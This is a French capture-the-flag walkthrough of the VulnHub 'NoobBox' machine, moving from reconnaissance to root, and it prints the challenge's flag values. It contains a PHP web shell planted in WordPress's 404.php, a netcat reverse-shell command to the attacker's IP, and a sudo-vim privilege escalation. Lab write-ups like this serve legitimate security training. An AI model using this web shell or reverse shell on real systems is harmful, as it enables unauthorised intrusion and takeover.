# Shadow Phreak - NoobBox

Pour cette machine de niveau débutant, l'auteur nous indique qu'il faut trouver 2 flags :
* un flag utilisateur
* un flag administrateur

Il nous indique également que sa machine fonctionne mieux sur VirtualBox que sur VMware.

# Analyse 

## Recherche de l'adresse IP de la machine

L'adresse MAC de la carte réseau de ma machine s'exécutant sous VirtualBox commencera toujours par "08:00:27".  
Je lance donc la commande suivante :
```
sudo netdiscover | grep "08:00:27"

192.168.7.96    08:00:27:b0:7d:2d      1      60  PCS Systemtechnik GmbH
```
Elle me permet d'obtenir l'adresse IP de ma machine : 192.168.7.96

## Recherche d'un point d'entrée

Je commence une première approche avec nmap :
```
sudo nmap -A 192.168.7.96 -p-

PORT   STATE    SERVICE VERSION
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
```
Le point d'entrée sera donc le port 80.

Je visite le site web, il s'agit de la page par défaut d'Apache 2.

Je cherche ensuite s'il n'y a pas des répertoires cachés :
```
dirb http://192.168.7.96

==> DIRECTORY: http://192.168.7.96/wordpress/
```

Je découvre qu'il y a un site WordPress, son contenu ne contient rien d'intéressant.  
Je recherche s'il contient une faille :
```
wpscan --url http://192.168.7.96/wordpress/ -e u

[+] noobbox
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Il ne contient pas de faille mais j'ai récupéré le nom d'utilisateur : noobbox  

Je vais essayer de trouver des fichiers cachés :
```
dirb http://192.168.7.96 -X .php,.html,.bak,.png,.jpg

+ http://192.168.7.96/img.jpg (CODE:200|SIZE:4811)
```

Dans cette image, je trouve la chaîne de caractères suivante : 5p4c3

Je me connecte au site à l'adresse suivante : http://192.168.7.96/wordpress/wp-admin/

Je me rends vite compte que le site utilise l'adresse IP `192.168.43.162` dans tous les liens.

Pour contourner le problème, j'utilise Burp Suite et je remplace en temps réel cette adresse IP par celle de ma VM :

![](https://github.com/mrousse83/VulnHub/raw/main/VulnHub/Shadow%20Phreak/NoobBox/burp.png)

# Exploitation

## Mise en place d'un web shell

Une fois connecté sur l'interface d'administration de WordPress, je modifie la page d'erreur `404.php`, je remplace son contenu par mon web shell :
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

Ensuite, je visite le site en chargeant une page qui n'existe pas afin de faire exécuter ce code.  

J'obtiens mon flag avec la commande suivante : `cat ../../../../home/noobbox/user.txt`
```
USER FLAG : {e7028891afea8df6164a35880cc7e2e5}
```

## Mise en place d'un reverse shell

J'exécute la commande suivante dans mon web shell : `nc 192.168.7.15 7777 -e /bin/bash`

Une fois connecté sur mon reverse shell, je passe sur un shell interactif avec la commande suivante : `python -c 'import pty; pty.spawn("/bin/bash")'`

Je regarde avec quel utilisateur je suis connecté `id` :
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Je me connecte à l'utilisateur `noobbox` : `su - noobbox`

Je regarde à quel groupe appartient cet utilisateur : `id`
```
uid=1000(noobbox) gid=1000(noobbox) groups=1000(noobbox),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
```

Je regarde quels sont ses droits avec la commande `sudo` : `sudo -l`
```
Matching Defaults entries for noobbox on N00bBox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User noobbox may run the following commands on N00bBox:
    (ALL : ALL) /usr/bin/vim
```

## Escalade de privilèges

Je deviens `root` avec la commande suivante : `vim -c ':!/bin/sh'`

Pour vérifier : `id`
```
uid=0(root) gid=0(root) groups=0(root)
```

Je récupère le flag administrateur :
```
cd root
ls -al
cat root.txt
```

Le voici :
```
ROOT FLAG : {a4c45279eaad84e5bb8ae0dfc5034400}
```
